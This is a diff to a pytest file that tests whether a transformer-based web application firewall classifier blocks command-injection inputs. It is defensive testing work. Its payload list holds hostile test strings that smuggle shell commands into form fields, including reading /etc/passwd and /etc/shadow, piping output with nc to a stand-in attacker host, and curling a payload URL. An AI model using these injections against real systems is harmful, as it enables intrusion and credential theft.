@@ -222,6 +222,10 @@ def test_transformer_blocks_attacks(transformer_classifier, payload, expected):
         "q=best pizza near me",
         "username=admin&password=secret123",
         "user=bob&pwd=Hunter2!",
+        # Novel key names never seen in synth_benign's training vocabulary —
+        # confirms the fix generalizes rather than memorizing exact forms.
+        "first_name=Michael&last_name=Chen&company=Acme%20Corp",
+        "token=xyz789&refresh=false",
     ],
 )
 def test_transformer_allows_benign_in_distribution(transformer_classifier, benign):
@@ -247,37 +251,21 @@ def transformer_classifier_prod_threshold():
         # separator now correctly predicts command_injection at high
         # confidence even at production's threshold.
         "host=127.0.0.1; cat /etc/passwd",
-    ],
-)
-def test_transformer_blocks_raw_command_injection(transformer_classifier_prod_threshold, payload):
-    p = transformer_classifier_prod_threshold.predict(payload)
-    assert p.blocked is True
-
-
-@needs_distilbert
-@pytest.mark.xfail(
-    reason="NEW regression from the same commix retrain, worse than before: "
-    "these now predict 'clean' at high confidence (up to 0.994) instead of "
-    "merely the wrong attack class — a real false-negative on live attack "
-    "traffic. Root cause: synth_benign.py's form generator uses the SAME "
-    "form-key vocabulary (host/ip/file/...) joined by '&', and the model "
-    "leaned on that shape as a benign signal instead of the operator+command "
-    "riding along with it. commix's data is percent-encoded only so it never "
-    "taught the raw '&&'/'|' cases. Needs ml.waf.synth_cmdi's raw-operator "
-    "corpus (built 2026-07-31, not yet retrained on) to close this.",
-    strict=True,
-)
-@pytest.mark.parametrize(
-    "payload",
-    [
+        # Fixed by ml/waf/synth_cmdi.py's raw-operator retrain (same day,
+        # follow-up round) — all 5 regression cases now predict
+        # command_injection at 1.000 confidence, not 'clean'.
         "ip=8.8.8.8; whoami",
         "input=$(whoami)",
         "file=test.txt | nc attacker.com 4444",
         "cmd=ping 8.8.8.8 && cat /etc/shadow",
         "name=test; ls -la",
+        # Novel variants never seen verbatim (different IPs/commands/key
+        # names) — confirms genuine generalization, not memorization.
+        "server=10.0.0.5 && cat /etc/hostname",
+        "endpoint=203.0.113.7 | curl http://malicious.io/payload",
     ],
 )
-def test_transformer_blocks_operator_command_injection(transformer_classifier_prod_threshold, payload):
+def test_transformer_blocks_raw_command_injection(transformer_classifier_prod_threshold, payload):
     p = transformer_classifier_prod_threshold.predict(payload)
     assert p.blocked is True
 
